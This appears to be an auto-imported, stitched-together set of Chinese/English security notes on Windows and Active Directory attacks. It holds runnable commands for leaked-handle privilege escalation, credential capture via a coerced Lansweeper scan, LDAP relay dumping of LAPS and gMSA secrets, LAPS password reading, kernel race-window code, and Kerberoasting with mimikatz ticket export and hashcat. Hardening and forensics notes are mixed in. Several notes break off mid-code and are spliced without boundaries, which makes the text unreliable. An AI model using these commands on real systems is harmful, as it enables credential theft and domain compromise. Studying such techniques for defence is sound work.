If you have access over an AD in linux (or bash in Windows) you can try https://github.com/lefayjey/linWinPwn to enumerate the AD. content: 来源路径： 02-知识点/域与Windows/Leaked Handle 利用.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Leaked Handle 利用 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Leaked Handle 利用 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Leaked Handle 利用 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Introduction、Interesting Handles、Process、Thread、File, Key & Section Handles；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Introduction Interesting Handles Process Thread File, Key & Section Handles How to see handles of processes Process Hacker Sysinternals Handles LeakedHandlesFinder 方法论 Vulnerable Example 利用 Example 1 利用 Example 2 Other 工具 and examples # 核心要点 There have been already several 权限提升 cases where a privileged process with open and inheritable handles have run an unprivileged process giving it access to all those handles. For example, imagine that a process running as SYSTEM open a new process (OpenProcess()) with full access. The same process also creates a new process (CreateProcess()) with low privileges but inheriting all the open handles of the main process.\ Then, if you have full access to the low privileged process, you can grab the open handle to the privileged process created with OpenProcess() and inject a shellcode. As you read on the initial example if an unprivileged process inherits a process handle of a privileged process with enough permissions it will be able to execute arbitrary code on it. In this excellent article you can see how to 利用 any process handle that has any of the following permissions: PROCESS CREATE THREAD THREAD DIRECT IMPERSONATION THREAD SET CONTEXT Section Handles are similar to file handles, the common name of this kinds of objects is "File Mapping". They are used to work with big files without keeping the entire file in memory. That makes the 利用 kind of "similar" to the 利用 of a File Handle. Process Hacker is a tool you can 下载 for free. It has several amazing options to inspect processes and one of them is the capability to see the handles of each process. This tool allows you to monitor leaked handles and even autoexploit them to escalate privileges. # 命令 / 载荷 / 操作片段 # 1. Idea: create a Scanning Target that points to your host and map existing Scanning 凭据 to it. When the scan runs, Lansweeper will attempt to authenticate with those 凭据，and your honeypot will capture them. Scanning → Scanning Targets → Add Scanning Target Scanning → Scanning 凭据 → ensure Linux/SSH creds exist; map them to the new target (enable all as needed) Click “Scan now” on the target Run an SSH honeypot and retrieve the attempted username / 密码 Works similarly for other protocols when you can coerce the scanner to your listener (SMB/WinRM honeypots, etc.). The ldapsearch (C) tool can also be used. The ldapsearch-ad Python script can also be used to enumerate essential information like domain admins that have their 密码 set to never expire, default 密码 policies and the ones found in GPOs, trusts, kerberoastable accounts, and so on.\ The windapsearch script (Go (preferred) or Python) can be used to enumerate basic but useful information. === ldapdomaindump ldapdomaindump is an Active Directory 域 information dumper via LDAP, outputting information in human-readable HTML files. map information regarding AD-CS (Active Directory 域 证书服务) # 命令 / 载荷 / 操作片段 # 1. LDAP 12345# remotely dump informationldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" all "ldeepdump/$DOMAIN"# parse saved information (in this case, enumerate trusts)ldeep cache -d "ldeepdump" -p "$DOMAIN" trusts # 2. LDAP 1234567# list naming contextsldapsearch -h "$DC_IP" -x -s base namingcontextsldapsearch -H "ldap://$DC_IP" -x -s base namingcontexts# enumerate info in a base (e.g. naming context = DC=DOMAIN,DC=LOCAL)ldapsearch -h "$DC_IP" -x -b "DC=DOMAIN,DC=LOCAL"ldapsearch -H "ldap://$TARGET" -x -b "DC=DOMAIN,DC=LOCAL" # 3. LDAP 1ldapsearch-ad --type all --server "$DC_IP" --domain "$DOMAIN" --username "$USER" --password "$PASSWORD" # 4. LDAP 1ldapsearch-ad --type info --server "$DC_IP" --domain "$DOMAIN" --username "$USER" --password "$PASSWORD" # 5. LDAP 12345678# enumerate users (authenticated bind)windapsearch -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc "$DC_IP" --module users# enumerate users (anonymous bind)windapsearch --dc "$DC_IP" --module users# obtain metadata (anonymous bind)windapsearch --dc "$DC_IP" --module metadata # 6. LDAP 1ldapdomaindump --user "$DOMAIN"\\"$USER" --password "$PASSWORD" --outdir ldapdomaindump "$DC_IP" # 7. LDAP 1ntlmrelayx -t ldap://"$DC_IP" --dump-adcs --dump-laps --dump-gmsa # 8. LDAP 123456789101112131415# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# Dump any LDAP object in the 'ADLAB.LOCAL' domain, then extract the ones with the WORKSTATION_TRUST_ACCOUNT, or NORMAL_ACCOUNT UAC flags$DumpLdap = Invoke-PassTheCert -Action 'Filter' -LdapConnection $LdapConnection -SearchBase 'DC=ADLAB,DC=LOCAL' -SearchScope Subtree -Properties * -LDAPFilter '(objectClass=*)'$DumpLdap |?{$_.sAMAccountName -ne $null -and ($_.useraccountcontrol -like '*WORKSTATION_TRUST_ACCOUNT*' -or $_.useraccountcontrol -like '*NORMAL_ACCOUNT*')} |Select-Object sAMAccountName,description,useraccountcontrol,distinguishedname,serviceprincipalname |fl# Dump all the inbound ACEs of user 'Kinda KU. USY' in the 'ADLAB.LOCAL' domain, then extract the permissive rights granted to non-default RIDs (i.e. above 1000), or permissive groups (e.g. 'Everyone' with SID 'S-1-1-0')$DumpInboundACLs = Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection $LdapConnection -Object 'CN=Kinda KU. USY,CN=Users,DC=ADLAB,DC=LOCAL'$DumpInboundACLs |?{ $_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*GenericWrite*' -or $_.AccessMaskNames -ilike '*WriteProperty*' -or $_.AccessMaskNames -ilike '*WriteDACL*') -and ($_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{4,}' -or $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}513' -or $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}515' -or $_.SecurityIdentifier -in @('S-1-1-0', 'S-1-5-11', 'S-1-5-15', 'S-1-5-7', 'S-1-5-32-545', 'S-1-5-32-546')) } # 9. content: 来源路径： 02-知识点/域与Windows/LDAP Signing & Channel Binding Hardening 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # LDAP Signing & Channel Binding Hardening 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 LDAP Signing & Channel Binding Hardening 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 LDAP Signing & Channel Binding Hardening 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：LDAP Signing & Channel Binding Hardening、Why it matters、LDAP Channel Binding (LDAPS only)、LDAP Signing、Audit-first rollout (recommended ~30 days)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 LDAP Signing & Channel Binding Hardening Why it matters LDAP Channel Binding (LDAPS only) LDAP Signing Audit-first rollout (recommended ~30 days) # 核心要点 LDAP relay/MITM lets attackers forward binds to Domain Controllers to obtain authenticated contexts. Two server-side controls blunt these paths: LDAP Channel Binding (CBT) ties an LDAPS bind to the specific TLS tunnel, breaking relays/replays across different channels. LDAP Signing forces integrity-protected LDAP messages, preventing tampering and most unsigned relays. Server 2025 DCs introduce a new GPO (LDAP server signing requirements Enforcement) that defaults to Require Signing when left Not Configured. To avoid enforcement you must explicitly set that policy to Disabled. KB4520412 (Server 2019/2022) adds LDAPS CBT “what-if” telemetry. GPO (DCs): Domain controller: LDAP server channel binding 令牌 requirements Always (enforce: rejects LDAPS binds without valid CBT) 3074 – LDAPS bind would have failed CBT validation if enforced. 3075 – LDAPS bind omitted CBT data and would be rejected if enforced. Enforcement: set Always once LDAPS clients send CBTs; only effective on LDAPS (not raw 389). Client GPO: Network security: LDAP client signing requirements = Require signing (vs Negotiate signing default on modern Windows). Legacy: Domain controller: LDAP server signing requirements = Require signing (default is None). Server 2025: leave legacy policy at None and set LDAP server signing requirements Enforcement = Enabled (Not Configured = enforced by default; set Disabled to avoid it). Compatibility: only Windows XP SP3+ supports LDAP signing; older systems will break when enforcement is enabled. # 命令 / 载荷 / 操作片段 # 1. Audit-first rollout (recommended ~30 days) 1Reg Add HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics /v "16 LDAP Interface Events" /t REG_DWORD /d 2 # 工具与参考入口 TrustedSec：LDAP Channel Binding and LDAP Signing Microsoft KB4520412：LDAP channel binding & signing requirements Microsoft CVE-2017-8563：LDAP relay mitigation update 0xdf – HTB Bruno (LDAP signing disabled → Kerberos relay → RBCD) # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Active Directory 攻击链 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/LAPS 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # LAPS 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 LAPS 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 LAPS 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：LAPS、Basic Information、Legacy Microsoft LAPS attributes、Windows LAPS attributes、Check if activated；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 13 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 LAPS Basic Information Legacy Microsoft LAPS attributes Windows LAPS attributes Check if activated LAPS 密码 Access Legacy Microsoft LAPS PowerShell cmdlets Windows LAPS PowerShell cmdlets PowerView / LDAP Linux / remote tooling Directory synchronization abuse LAPSToolkit Dumping LAPS Passwords With NetExec / CrackMapExec Using LAPS 密码 LAPS 持久化 Expiration Date Snapshot rollback caveat on newer Windows LAPS Automatic account management tamper caveat # 核心要点 Legacy Microsoft LAPS: stores the local administrator 密码 in ms-Mcs-AdmPwd and the expiration time in ms-Mcs-AdmPwdExpirationTime. Windows LAPS (built into Windows since the April 2023 updates): can still emulate legacy mode, but in native mode it uses msLAPS-* attributes, supports 密码 encryption, 密码 history, and DSRM 密码 backup for domain controllers. ms-Mcs-AdmPwd: plain-text administrator 密码 ms-Mcs-AdmPwdExpirationTime: 密码 expiration time msLAPS - 密码: clear-text 密码 blob stored as JSON when encryption is not enabled msLAPS-PasswordExpirationTime: scheduled expiration time msLAPS-EncryptedPassword: encrypted current 密码 msLAPS-EncryptedPasswordHistory: encrypted 密码 history msLAPS-EncryptedDSRMPassword / msLAPS-EncryptedDSRMPasswordHistory: encrypted DSRM 密码 data for domain controllers msLAPS-CurrentPasswordVersion: GUID-based version tracking used by newer rollback - 检测 logic (Windows Server 2025 forest schema) Get-LapsADPassword automatically handles legacy LAPS, clear-text Windows LAPS, and encrypted Windows LAPS. If the 密码 is encrypted and you can read but not decrypt it, the cmdlet returns metadata such as Source, DecryptionStatus, and AuthorizedDecryptor even when it can't return the clear-text 密码. In encrypted Windows LAPS, read permission and decrypt permission are different controls. Having OU / object read access doesn't automatically mean you can decrypt msLAPS-EncryptedPassword. 密码 history is only available when Windows LAPS encryption is enabled. # 命令 / 载荷 / 操作片段 # 1. Windows LAPS attributes 1{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."} # 2. Check if activated 123456789101112131415161718192021# Legacy Microsoft LAPS policyreg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnableddir "C:\Program Files\LAPS\CSE"# Check if that folder exists and contains AdmPwd.dll# Native Windows LAPS binaries / PowerShell moduleGet-Command *Laps*dir "$env:windir\System32\LAPS"# Find GPOs that have "LAPS" or some other descriptive term in the nameGet-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname# Native Windows LAPS-enabled computersGet-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' | select DnsHostname # 3. Legacy Microsoft LAPS PowerShell cmdlets 123456789101112131415161718Get-Command *AdmPwd*CommandType Name Version Source----------- ---- ------- ------Cmdlet Find-AdmPwdExtendedRights 5.0.0.0 AdmPwd.PSCmdlet Get-AdmPwdPassword 5.0.0.0 AdmPwd.PSCmdlet Reset-AdmPwdPassword 5.0.0.0 AdmPwd.PSCmdlet Set-AdmPwdAuditing 5.0.0.0 AdmPwd.PSCmdlet Set-AdmPwdComputerSelfPermission 5.0.0.0 AdmPwd.PSCmdlet Set-AdmPwdReadPasswordPermission 5.0.0.0 AdmPwd.PSCmdlet Set-AdmPwdResetPasswordPermission 5.0.0.0 AdmPwd.PSCmdlet Update-AdmPwdADSchema 5.0.0.0 AdmPwd.PS# List who can read the LAPS password of the given OUFind-AdmPwdExtendedRights -Identity Workstations | fl# Read the passwordGet-AdmPwdPassword -ComputerName wkstn-2 | fl # 4. content: 来源路径： 02-知识点/域与Windows/Kernel 条件竞争 利用 via Object Manager Slow Paths.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Kernel 条件竞争 利用 via Object Manager Slow Paths [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Kernel 条件竞争 利用 via Object Manager Slow Paths 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Kernel 条件竞争 利用 via Object Manager Slow Paths 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Why stretching the race window matters、Object Manager lookup internals in a nutshell、Slowdown primitive #1 – Single maximal component、Slowdown primitive #2 – Deep recursive directories、Slowdown primitive #3 – Shadow directories, 哈希 collisions & symlink reparses (minutes instead of microseconds)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Why stretching the race window matters Object Manager lookup internals in a nutshell Slowdown primitive #1 – Single maximal component Slowdown primitive #2 – Deep recursive directories Slowdown primitive #3 – Shadow directories, 哈希 collisions & symlink reparses (minutes instead of microseconds) 2025 retest notes & ready-made tooling Measuring your race window 利用 workflow Operational considerations Defensive notes # 核心要点 UNICODE STRING limit – OM paths are carried inside a UNICODE STRING whose Length is a 16-bit value. The absolute limit is 65 535 bytes (32 767 UTF-16 codepoints). With prefixes like \BaseNamedObjects, an attacker still controls ≈32 000 characters. Attacker prerequisites – Any user can create objects underneath writable directories such as \BaseNamedObjects. When the vulnerable code uses a name inside, or follows a symbolic link that lands there, the attacker controls the lookup performance with no special privileges. Because everything lives in user-writable namespaces, the 载荷 works from a standard user integrity level. Keep a handle array so you can delete the chain cleanly after 利用 to avoid polluting the namespace. Object directories support shadow directories (fallback lookups) and bucketed 哈希 tables for entries. Abuse both plus the 64-component symbolic-link reparse limit to multiply slowdown without exceeding the UNICODE STRING length: Fill each directory with thousands of colliding names that land in the same 哈希 bucket (e.g., varying trailing digits while keeping the same RtlHashUnicodeString value). Lookups now degrade to O (n) linear scans inside a single directory. Why it matters: A minutes-long slowdown turns one-shot race-based LPEs into deterministic exploits. Create a symbolic link so that the name the kernel expects now resolves to the slow path. You can point the vulnerable driver’s directory lookup to your structure without touching the original target. Thread A (victim) executes the vulnerable code and blocks inside the slow lookup. Thread B (attacker) flips the guarded state (e.g., swaps a file handle, rewrites a symbolic link, toggles object security) while Thread A is occupied. When Thread A resumes and performs the privileged action, it observes stale state and performs the attacker-controlled operation. File-system races – If the vulnerable path ultimately resolves through NTFS, you can stack an Oplock (e.g., SetOpLock.exe from the same toolkit) on the backing file while the OM slowdown runs, freezing the consumer for additional milliseconds without altering the OM graph. Enforce upper bounds on OM path depth/length before dereferencing user-controlled names. Rejecting overly long names forces attackers back into the microsecond window. Instrument object manager namespace growth (ETW Microsoft-Windows-Kernel-Object) to detect suspicious thousands-of-components chains under \BaseNamedObjects. # 命令 / 载荷 / 操作片段 # 1. Slowdown primitive #1 – Single maximal component 123456std::wstring path;while (path.size() <= 32000) { auto result = RunTest(L"\\BaseNamedObjects\\A" + path, 1000); printf("%zu,%f\n", path.size(), result); path += std::wstring(500, 'A');} # 2. Slowdown primitive #2 – Deep recursive directories 1234567891011ScopedHandle base_dir = OpenDirectory(L"\\BaseNamedObjects");HANDLE last_dir = base_dir.get();std::vector<ScopedHandle> dirs;for (int i = 0; i < 16000; i++) { dirs.emplace_back(CreateDirectory(L"A", last_dir)); last_dir = dirs.back().get(); if ((i % 500) == 0) { auto result = RunTest(GetName(last_dir) + L"\\X", iterations); printf("%d,%f\n", i + 1, result); }} # 3. Slowdown primitive #3 – Shadow directories, 哈希 collisions & symlink reparses (minutes instead of microseconds) 123456ScopedHandle shadow = CreateDirectory(L"\\BaseNamedObjects\\A");ScopedHandle target = CreateDirectoryEx(L"A", shadow.get(), shadow.get());CreateCollidingEntries(shadow, 16000, dirs);CreateCollidingEntries(target, 16000, dirs);Create

content: 来源路径： 02-知识点/域与Windows/Kerberos 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Kerberos 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Kerberos 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Kerberos 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Kerberos、Tickets、Roasting、Delegations、Relays；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 Kerberos Tickets Roasting Delegations Relays Service-for-User extensions User-to-User 认证 # 核心要点 A Kerberos realm is a logical group of networked computers that share a common 认证 database. The 认证 database is used to store the Kerberos tickets that are issued to users and services when they authenticate to the network. In a Kerberos environment, each networked computer is a member of a realm. The realm is responsible for authenticating users and services and for issuing and managing Kerberos tickets. A Kerberos realm can be implemented on any type of network, including networks that are not running Windows. In fact, the Kerberos protocol was developed as an open standard and is used by many different types of operating systems and networks. On a Windows network, a Kerberos realm is typically equivalent to a domain. Each domain in a Windows network is a member of a realm, and the domain controller is responsible for authenticating users and services and for issuing and managing Kerberos tickets. However, on a non-Windows network, a Kerberos realm can be implemented independently of any domain structure. In this case, the Kerberos server is responsible for authenticating users and services and for issuing and managing Kerberos tickets. The Hacker Recipes mainly covers Kerberos attacks in a Windows context, but some attacks can also be conducted in non-Windows networks. A ST is encrypted with the service account's NT 哈希. An attacker knowing a service account's NT 哈希 can use it to forge a Service ticket and obtain access to that service. This forged Service ticket is called a 白银票据. Service for User to Self (S4U2self): allows a service to obtain a Service Ticket, on behalf of another user (called "principal"), to itself. Service for User to Proxy (S4U2proxy): allows a service to obtain a Service Ticket, on behalf of a user to a different service. the ST used as "additional-ticket" must have the forwardable flag set. Request contains an additional-tickets field containing the target user TGT. Request contains the ENC-TKT-IN-SKEY flag in the kdc-options field, indicating that the ticket for the end server is to be encrypted in the session key from the additional TGT provided (doc). operate RBCD attacks from SPN-less accounts operate an unPAC-the - 哈希 attack # 工具与参考入口 RFC 4120 section 6.2 swarm.ptsecurity.com more Kerberos keys calculation doc doc doc Frequently Asked Questions about Kerberos # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Active Directory 攻击链 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

When an 认证 occurs through Kerberos, 凭据 aren't cached in memory. Therefore, if you run mimikatz you won't find 凭据 of the user in the machine even if he is running processes. This is because when connecting with Kerberos these are the steps: User1 provides 凭据 and domain controller returns a Kerberos TGT to the User1. User1 uses TGT to request a service ticket to connect to Server1. User1 connects to Server1 and provides service ticket. # 命令 / 载荷 / 操作片段 # 1. CredSSP 123Invoke-Command -ComputerName bizintel -Credential ta\redsuit -ScriptBlock { Get-WSManCredSSP} # 2. Remote Credential Guard (RCG) 123("KB5036896","KB5036899","KB5036894") | ForEach-Object { Get-HotFix -Id $_ -ErrorAction SilentlyContinue} # 3. content: 来源路径： 02-知识点/域与Windows/Kerberoasting 服务票据离线爆破.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Kerberoasting 服务票据离线爆破 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Kerberoasting 服务票据离线爆破 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Kerberoasting 服务票据离线爆破 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Key Points、Service account secrets & Kerberos 密码学 cost、Attack、Linux、Windows；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 15 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Key Points Service account secrets & Kerberos 密码学 cost Attack Linux Windows OPSEC and AES-only environments Cracking 持久化 / Abuse Targeted Kerberoasting 服务票据离线爆破 via GenericWrite/GenericAll over a user (temporary SPN) Kerberoasting 服务票据离线爆破 without a domain account (AS-requested STs) 检测 Mitigation / Hardening # 核心要点 Any authenticated domain user can request TGS tickets, so no special privileges are needed. Targets TGS tickets for services that run under user accounts (i.e., accounts with SPN set; not computer accounts). Tickets are encrypted with a key derived from the service account’s 密码 and can be cracked offline. No elevated privileges required; any authenticated account can request TGS tickets. Also, avoid “spray-and-pray” roasting. Rubeus’ default Kerberoasting 服务票据离线爆破 can query and request tickets for all SPNs and is noisy. Enumerate and target interesting principals first. Enumerate kerberoastable users Rubeus: /rc4opsec uses tgtdeleg to enumerate accounts without AES and requests RC4 service tickets. Rubeus: /aes enumerates accounts with AES enabled and requests AES service tickets (etype 17/18). If you already hold a TGT (PTT or from a .kirbi), you can use /ticket:<blob|path> with /spn:<SPN> or /spns:<file> and skip LDAP. Filter for likely weak passwords using /pwdsetbefore:<MM-dd-yyyy> (older passwords) or target privileged OUs with /ou:<DN>. Crack the $krb5tgs232323... 哈希 with hashcat. Use gMSA/dMSA or machine accounts for services. Managed accounts have 120+ character random passwords and rotate automatically, making offline cracking impractical. Enforce AES on service accounts by setting msDS-SupportedEncryptionTypes to AES-only (decimal 24 /hex 0x18) and then rotating the 密码 so AES keys are derived. Use long, random service account passwords (25+ chars) if managed accounts are not feasible; ban common passwords and audit regularly. # 命令 / 载荷 / 操作片段 # 1. Linux 123456789101112131415161718# Metasploit Frameworkmsf> use auxiliary/gather/get_user_spns# Impacket — request and save roastable hashes (prompts for password)GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast# With NT hashGetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast# Target a specific user’s SPNs only (reduce noise)GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER># NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadatanetexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes# kerberoast by @skelsec (enumerate and roast)# 1) Enumerate kerberoastable users via LDAPkerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable# 2) Request TGS for selected SPNs and dumpkerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Linux 12# ADenum: https://github.com/SecuProject/ADenumadenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c # 3. Windows 12345678# Built-insetspn.exe -Q */* # Focus on entries where the backing object is a user, not a computer ($)# PowerViewGet-NetUser -SPN | Select-Object serviceprincipalname# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.).\Rubeus.exe kerberoast /stats # 4. Windows 1234567891011121314# Acquire a single service ticket in memory for a known SPNAdd-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>" # e.g. MSSQLSvc/mgmt.domain.local# Get all cached Kerberos ticketsklist# Export tickets from LSASS (requires admin)Invoke-Mimikatz -Command '"kerberos::list /export"'# Convert to cracking formatspython2.7 kirbi2john.py .\some_service.kirbi > tgs.john# Optional: convert john -> hashcat etype23 if neededsed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat # 5. Windows 1234567891011# PowerView — single SPN to hashcat formatRequest-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast# PowerVi

Subkeys commonly store UsernameHint, and the key LastWrite time is a useful pivot. Shellbags are stored in both NTUSER.DAT\Software\Microsoft\Windows\Shell\BagMRU / Bags and UsrClass.dat\Local Settings\Software\Microsoft\Windows\Shell\BagMRU / Bags. NTUSER.DAT entries are especially useful for UNC/network browsing, while UsrClass.dat is where Windows Vista+ commonly stores local/removable-folder shellbags. They can show folder existence, traversal, and folder-view preferences even after the folder was deleted. Explorer-like access to archive files can also leave shellbag traces. Not every shellbag proves successful folder access, so corroborate with LNKs, Jump Lists, timestamps, or volume mappings. Use Shellbag Explorer or SBECmd to parse them. To tie a device to a user, pivot from device or volume identifiers into per-user artifacts such as shellbags, LNKs, Jump Lists, RecentDocs, and MountPoints2. # 工具与参考入口 Shellbag Explorer Windows Registry 取证 速查 2026：Cyber Triage USB Device 取证 on Windows 10 and 11：ElcomSoft # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

